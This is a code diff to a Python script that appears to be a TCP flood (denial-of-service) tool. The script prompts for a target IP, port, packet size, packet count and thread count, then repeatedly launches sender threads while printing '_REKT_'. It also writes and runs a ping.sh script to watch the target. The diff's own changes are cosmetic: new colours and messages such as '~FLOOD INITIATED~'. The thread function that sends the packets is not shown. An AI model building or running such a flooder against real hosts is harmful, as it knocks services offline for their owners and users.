@@ -22,7 +22,7 @@ done
     with open(bash_script_name, 'w') as bash_file:
         bash_file.write(bash_script_content)
     os.chmod(bash_script_name, 0o755)
-    print(color_red(f"Bash script '{bash_script_name}' created to ping {ip_address}."))
+    print(color_yellow(f"File '{bash_script_name}' created."))
 
 def execute_bash_script():
     os.system('./ping.sh')
@@ -41,6 +41,11 @@ def color_yellow(text):
     YELLOW = "\033[0;33m" 
     RESET = "\033[0m"
     return f"{YELLOW}{text}{RESET}"
+
+def color_green(text):
+    GREEN = "\033[32m" 
+    RESET = "\033[0m"
+    return f"{GREEN}{text}{RESET}"
 
 def create_message(size):
     return b'X' * size 
@@ -70,18 +75,22 @@ TCP_IP = input(color_red("Enter the target IP address: "))
 TCP_PORT = int(input(color_red("Enter the target port number: ")))
 packet_size = int(input(color_red("Enter packet size in bytes (1-1460):")))
 amount = int(input(color_red("Number of packets to send:")))
-print(color_yellow("File to monitor ping of " + TCP_IP + " will be created. Run ./FLOOD/ping.sh in a seperate terminal after flood has been initialized."))
+print(color_yellow("FLOOD will be initialized after next input.")) 
+print(color_yellow("Run ./FLOOD/ping.sh in a seperate terminal after initializing "))
+print(color_yellow("to monitor ping of " + color_green(TCP_IP)))
 thread_count = int(input(color_red("Enter the number of threads: ")))
 
 user_ip = TCP_IP
     
 makebash(user_ip)
-    
+
+print(color_green("~FLOOD INITIATED~"))
+
 for i in range(amount):
     start_threads(TCP_IP, TCP_PORT, packet_size, thread_count)
     print(color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}"))
 
-print("~DONE~") 
+print(color_green("~DONE~")) 
 
 
 
